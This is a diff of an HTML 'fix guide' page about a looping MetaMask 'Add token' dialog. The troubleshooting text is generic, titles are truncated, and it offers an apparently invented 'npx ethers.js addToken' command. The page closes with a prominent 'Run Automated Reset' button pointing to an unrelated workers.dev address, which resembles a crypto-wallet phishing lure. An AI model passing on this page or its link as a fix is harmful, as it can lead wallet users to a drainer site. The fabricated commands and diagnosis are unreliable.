@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A D – Fix Guide</title>
 <style>
     body {
         font-family: sans-serif;
-        background: #0f111a;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -39,37 +39,31 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</h1>
+<h1>Metamask Extension Bug Assets Confirming The Add Token From A D</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a persistent "Add token" page when attempting to confirm the addition of a token from a decentralized application (dapp) using the Metamask extension, with the dialog box failing to proceed beyond the confirmation step.</li>
+<li>The user attempts to add a token from a decentralized application (dapp) using Metamask, but the "Confirming the Add token" dialog keeps looping back to the "Add token" page, failing to complete the action.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue arises from a known bug within the Metamask extension, specifically related to the handling of token additions from dapps, which causes the confirmation dialog to loop indefinitely.</li>
+<li>This issue arises due to a bug within the Metamask extension, specifically related to its interaction with dapps when attempting to add new tokens. The extension fails to properly handle the confirmation process, resulting in an infinite loop.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to manually add the token by inputting its contract address and other necessary details directly into Metamask.</li>
-<li>Clear the browser's cache and cookies, then restart the browser to ensure a fresh environment.</li>
-<li>Utilize the following JSON configuration to reset Metamask settings:</li>
+<li>To resolve this issue, try the following manual overrides:</li>
+<li>Clear the Metamask extension's cache and storage.</li>
+<li>Manually input the token's contract address and details.</li>
+<li>Utilize the <code>ethers.js</code> library to interact with the Ethereum blockchain directly:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;provider&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="w">  </span><span class="p">},</span>
-<span class="w">  </span><span class="nt">&quot;tokens&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>npx<span class="w"> </span>ethers.js<span class="w"> </span>addToken<span class="w"> </span>--token-address<span class="w"> </span>0x...<span class="w"> </span>--token-symbol<span class="w"> </span>...
 </code></pre></div>
 
-<p>Consider utilizing an external console for deeper inspection and potential manual intervention. </p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Ensure Metamask is updated to the latest version.</li>
-<li>Verify that the dapp and its associated smart contracts are functioning correctly.</li>
-<li>Confirm the token's contract address and details are accurate and correctly formatted.</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding</a></li></ul>
+<p>Prerequisites:
+- Metamask extension installed and configured.
+- Basic understanding of Ethereum and token management.
+- Familiarity with command-line interfaces.
+You may want to consider using an external console for more complex token management tasks.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
